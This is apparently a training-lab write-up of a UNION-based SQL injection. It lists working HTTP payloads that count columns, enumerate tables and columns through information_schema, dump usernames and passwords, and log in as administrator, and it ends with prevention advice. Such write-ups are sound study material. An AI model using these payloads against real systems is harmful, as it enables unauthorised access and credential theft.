# SQL Injection Attack - Listing the Database Contents on Non-Oracle Databases

## Objective

Use a UNION-based SQL injection attack to discover the table containing user credentials, retrieve the usernames and passwords, and log in as the administrator user.

## Vulnerable Parameter

`category`

## Step 1: Determine the Number of Columns

Payload:

```http
GET /filter?category=Tech+gifts' UNION SELECT NULL,NULL-- HTTP/2
```

Result:
- Success
- No error returned

Conclusion:
- The original query returns 2 columns.

## Step 2: Verify Text-Compatible Columns

Payload:

```http
GET /filter?category=Tech+gifts' UNION SELECT 'abc','def'-- HTTP/2
```

Result:
- Success
- Both values appeared in the response.

Conclusion:
- Both columns accept string data.

## Step 3: Enumerate Database Tables

Payload:

```http
GET /filter?category=Tech+gifts' UNION SELECT table_name,NULL FROM information_schema.tables-- HTTP/2
```

Result:
- Database table names were displayed in the response.
- A table named `users_prsstx` was identified as likely containing user credentials.

## Step 4: Enumerate Columns in the Users Table

Payload:

```http
GET /filter?category=Tech+gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_prsstx'-- HTTP/2
```

Result:
- The columns `username_chksgu` and `password_vsvtjm` were identified.

## Step 5: Retrieve User Credentials

Payload:

```http
GET /filter?category=Tech+gifts' UNION SELECT username_chksgu,password_vsvtjm FROM users_prsstx-- HTTP/2
```

Result:
- Usernames and passwords from the table were displayed in the response.
- Administrator credentials were included in the results.

## Step 6: Log In as Administrator

Using the administrator credentials retrieved from the database, I successfully logged in as the administrator user and solved the lab.

## Explanation

The database schema was enumerated using the `information_schema` database.

First, table names were retrieved from:

```sql
information_schema.tables
```

Then, column names were retrieved from:

```sql
information_schema.columns
```

After identifying the correct table and columns, a UNION-based SQL injection attack was used to retrieve user credentials.

## Security Impact

An attacker could:

- Discover database structure.
- Enumerate tables and columns.
- Retrieve sensitive data.
- Compromise user accounts.
- Gain administrative access.

## Prevention

- Use parameterized queries (prepared statements).
- Avoid building SQL queries through string concatenation.
- Apply least-privilege database permissions.
- Validate and sanitize user input.
- Perform regular security testing.

## Key Concepts Learned

- UNION-based SQL injection
- Database schema enumeration
- information_schema.tables
- information_schema.columns
- Table discovery
- Column discovery
- Credential extraction
- Authentication compromise
